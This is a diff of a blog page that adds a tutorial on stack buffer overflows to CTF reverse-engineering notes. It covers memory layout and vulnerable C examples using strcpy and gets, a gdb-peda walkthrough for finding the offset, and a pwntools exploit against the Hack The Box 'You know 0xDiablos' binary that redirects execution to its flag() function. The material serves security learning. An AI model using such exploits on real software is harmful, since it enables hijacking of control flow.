@@ -250,6 +250,14 @@
 
 <p><!--more--></p>
 
+<h2 id="table-of-contents">Table of contents</h2>
+<ol>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#buffer-overflow">Buffer overflow</a></li>
+</ol>
+
+<h3 id="introduction-">Introduction <a name="introduction"></a></h3>
+
 <p>There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).</p>
 
 <p>The first step is to use regularly and pay attention to the strings appearing in the UI. Later, we can search those strings in the decompiler.</p>
@@ -261,6 +269,197 @@
 <p>Another interesting tool is <code class="language-plaintext highlighter-rouge">gdb</code>, the gnu debugger. More on this to come, when i’m not familiar.</p>
 
 <p>To debug Windows binaries, you can use <code class="language-plaintext highlighter-rouge">ollydbg</code>, analyse the code and place the breakpoints in the interesting addresses.</p>
+
+<h3 id="buffer-overflow-">Buffer overflow <a name="buffer-overflow"></a></h3>
+
+<p>In order to understand this attack, first we need to understand how the memory works in the computers.</p>
+
+<p>We first need to understand that memory has the following regions:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Stack</td>
+      <td>stores function local variables and information about function calls: return address, arguments, etc..</td>
+    </tr>
+    <tr>
+      <td>Heap</td>
+      <td>stores the dynamic memory. Used by malloc, etc…</td>
+    </tr>
+    <tr>
+      <td>BSS</td>
+      <td>stores the uninitialized static/global variables</td>
+    </tr>
+    <tr>
+      <td>Data</td>
+      <td>stores the static/global variables</td>
+    </tr>
+    <tr>
+      <td>Text</td>
+      <td>read only, stores the executable code</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Function arguments</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Return address</td>
+      <td>where to go when the execution ends</td>
+    </tr>
+    <tr>
+      <td>Previous frame pointer</td>
+      <td>to know what is the stack frame of the function calling this function</td>
+    </tr>
+    <tr>
+      <td>Local variables</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Take this functions as example:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+  <span class="cm">/* The following statement will result in buffer overflow */</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">str</span> <span class="o">=</span> <span class="s">"This is definitely longer than 12"</span><span class="p">;</span>
+  <span class="n">foo</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The stack frame for foo() will look like this:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>arguments: str (pointer)</td>
+    </tr>
+    <tr>
+      <td>Return address</td>
+    </tr>
+    <tr>
+      <td>Previous Frame Pointer</td>
+    </tr>
+    <tr>
+      <td>Local variables <br /><br />buffer[11]<br />…<br />buffer[1]</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>In this case, we can keep adding data into the buffer until we reach the memory address of the return address. 
+Then, we can tell the program to jump to any function that we want.</p>
+
+<p>Knowing that, buffer overflow technique consists in three stages:</p>
+
+<h3 id="overflow-the-stack-pointer">Overflow the stack pointer</h3>
+
+<p>when a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: <code class="language-plaintext highlighter-rouge">gets</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">local_bc</span> <span class="p">[</span><span class="mi">180</span><span class="p">];</span>
+  
+  <span class="n">gets</span><span class="p">(</span><span class="n">local_bc</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">local_bc</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.</p>
+
+<h3 id="reach-to-the-return-address">Reach to the return address</h3>
+
+<p>Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.</p>
+
+<p>In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.</p>
+
+<p>Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.</p>
+
+<p>You can do it in a less manual way using <code class="language-plaintext highlighter-rouge">gdb-peda</code>:</p>
+
+<p>Knowing that the buffer has 180 chars, let’s suppose that will 200 chars will overflow it, let’s create a pattern of 200 chars:</p>
+
+<p><code class="language-plaintext highlighter-rouge">pattern_create 200 bof.txt</code></p>
+
+<p>and input it to the program:</p>
+
+<p><code class="language-plaintext highlighter-rouge">r &lt; pattern.txt</code></p>
+
+<p>When the program crashes, we’ll see the registers:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You know <span class="nb">who </span>are 0xDiablos: 
+AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+
+Program received signal SIGSEGV, Segmentation fault.
+
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
+EAX: 0xc9 
+EBX: 0x76414158 <span class="o">(</span><span class="s1">'XAAv'</span><span class="o">)</span>
+ECX: 0xf7fa09b4 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+EDX: 0x1 
+ESI: 0xffffcf94 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd165 <span class="o">(</span><span class="s2">"/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln"</span><span class="o">)</span>
+EDI: 0xf7ffcb80 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+EBP: 0x41594141 <span class="o">(</span><span class="s1">'AAYA'</span><span class="o">)</span>
+ESP: 0xffffceb0 <span class="o">(</span><span class="s2">"ZAAxAAyA"</span><span class="o">)</span>
+EIP: 0x41417741 <span class="o">(</span><span class="s1">'AwAA'</span><span class="o">)</span>
+EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+Invalid <span class="nv">$PC</span> address: 0x41417741
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0xffffceb0 <span class="o">(</span><span class="s2">"ZAAxAAyA"</span><span class="o">)</span>
+0004| 0xffffceb4 <span class="o">(</span><span class="s2">"AAyA"</span><span class="o">)</span>
+0008| 0xffffceb8 <span class="nt">--</span><span class="o">&gt;</span> 0xf7fbeb00 <span class="nt">--</span><span class="o">&gt;</span> 0xf7d8fcd4 <span class="o">(</span><span class="s2">"GCC_3.0"</span><span class="o">)</span>
+0012| 0xffffcebc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8 
+0016| 0xffffcec0 <span class="nt">--</span><span class="o">&gt;</span> 0xffffcee0 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0020| 0xffffcec4 <span class="nt">--</span><span class="o">&gt;</span> 0xf7f9f000 <span class="nt">--</span><span class="o">&gt;</span> 0x229dac 
+0024| 0xffffcec8 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffd020 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffda40 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0028| 0xffffcecc <span class="nt">--</span><span class="o">&gt;</span> 0xf7d96519 <span class="nt">--</span><span class="o">&gt;</span> 0x8310c483 
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
+Legend: code, data, rodata, value
+0x41417741 <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div></div>
+<p>The interesting one is <code class="language-plaintext highlighter-rouge">EIP</code> as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.</p>
+
+<p>Now, we can use <code class="language-plaintext highlighter-rouge">pattern_offset</code> to obtain exactly the number of characters to reach to Return address:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41417741
+1094809409 found at offset: 188
+</code></pre></div></div>
+
+<p>Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.</p>
+
+<h3 id="write-the-exploit">Write the exploit</h3>
+
+<p>In the case I’m working on the exploit just need to call another function in the code. In order to so, I’ll use python <code class="language-plaintext highlighter-rouge">pwntools</code>: <a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a> which helps a lot on these kind of things.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"i386"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>
+
+<span class="c1"># offset to reach right before return address's location
+</span><span class="n">offset</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">188</span>
+
+<span class="c1"># craft exploit: offset + flag() + padding + parameter 1 + parameter 2
+</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'flag'</span><span class="p">],</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x90909090</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc0ded00d</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="n">exploit</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.</p>
 
     
   </section>
